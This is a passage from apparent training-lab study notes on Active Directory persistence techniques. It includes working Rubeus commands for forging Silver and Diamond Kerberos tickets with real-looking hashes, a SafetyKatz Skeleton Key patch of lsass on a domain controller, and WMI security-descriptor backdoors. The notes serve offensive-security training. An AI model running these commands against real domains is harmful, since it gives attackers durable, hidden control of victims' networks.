2. The Golden Ticket doesn't depend on any single account staying untouched. A forged TGT built from `krbtgt`'s hash survives every other password change in the domain — it only dies if `krbtgt` itself gets reset, and that has to happen twice to fully kill it.
3. Getting DA is only phase one of a real engagement. Phase two is not losing it — this is how persistence actually gets established in a compromised network.

### Silver Ticket

A forged **service ticket** rather than a TGT. Signed with the hash of whatever service account runs the target service, instead of `krbtgt`. Services rarely validate the PAC, and a Silver Ticket only grants access to the one service it targets, so the blast radius is a lot narrower than a Golden Ticket's. Persistence is reasonable too — 30 days by default for computer accounts. [Background here](https://en.hackndo.com/kerberos-silver-golden-tickets/) if you want the full breakdown.

```cmd
C:\AD\Tools\Rubeus.exe silver /service:http/dcorp-dc.dollarcorp.moneycorp.local /rc4:6e58e06e07588123319fe02feeab775d /sid:S-1-5-21-719815819-3726368948-3917688648 /ldap /user:Administrator /domain:dollarcorp.moneycorp.local /ptt
```

Same `/ldap` behavior as the Golden Ticket command — it queries the DC for supporting user info. And the same approach forges tickets for plenty of other services on a box: `HOST`, `RPCSS`, `CIFS`, and more.

### Diamond Ticket

Same idea as a Golden Ticket, but instead of forging a TGT from nothing, you take a **legitimately issued TGT and modify it**, then re-encrypt with `krbtgt`'s AES256 key.

Golden Ticket = forging. Diamond Ticket = modifying something real. Persistence still hinges on `krbtgt` staying unrotated, but it's noticeably more OPSEC-safe — the ticket times are legitimate since a real DC-issued TGT was the starting point, and unlike a Golden Ticket, there's an actual matching TGT request on record to back up the subsequent TGS requests.

You'll need the `krbtgt` AES key (RC4/AES of the target user also works):

```cmd
.\Loader.exe -path rubeus.exe -args diamond /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\windows\System32\cmd.exe /show /ptt
```

`/tgtdeleg` can stand in for explicit credentials when you're operating as a regular domain user.

### Skeleton Key

Patches `lsass` directly on a Domain Controller so it accepts one attacker-chosen password for *any* domain user, on top of their real one. Requires DA to set up.

```cmd
Safetykatz.exe '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

Once patched, any valid username authenticates fine with the skeleton password (`mimikatz`, in the lab):

```powershell
Enter-PSSession -ComputerName dcorp-dc -credential dcorp\Administrator
```

### DSRM

Every DC has a hard-coded local Administrator account stashed in its SAM file for DSRM recovery — essentially a backdoor for when AD itself is broken. If the DSRM password never gets rotated after install (very common), it's a durable credential most defenders have completely forgotten exists. Get your hands on the DSRM hash and Pass-the-Hash gets you an admin shell. [More detail here](https://www.thehacker.recipes/ad/persistence/dsrm).

### AdminSDHolder

`AdminSDHolder` exists to protect privileged domain objects (Domain Admins members, for example) from permission drift, by periodically reapplying a template ACL through the SDProp process. The abuse angle: plant a backdoor ACE directly on the `AdminSDHolder` object itself, and SDProp will happily propagate it back onto every protected account automatically. [Details here](https://www.thehacker.recipes/ad/persistence/adminsdholder).

### Security descriptor abuse

Applying the right ACEs directly on securable remote-access objects (WMI, for instance) lets a completely normal, non-admin user authenticate through that interface. Setting this up as persistence does require admin rights at the moment you plant it, though. [Reference here](https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/security-descriptors.html#access-to-winrm).

The lab objective: modify security descriptors on `dcorp-dc` so a normal user gets PowerShell Remoting and WMI access without needing admin rights, then retrieve the DC's machine account hash (no admin needed for this part) to run a Silver Ticket attack for WMI code execution.

Granting `student421` WMI access to the DC:

```powershell
Set-RemoteWMI -samaccountname student421 -ComputerName dcorp-dc -Namespace 'root\cimv2' -Verbose
```

Verifying it worked:

```powershell
Get-WmiObject -Namespace root\cimv2 -Class Win32_OperatingSystem -ComputerName dcorp-dc -Credential dcorp\student421
```

(PowerShell Remoting access can be granted the same way, through its own security descriptor.)

---
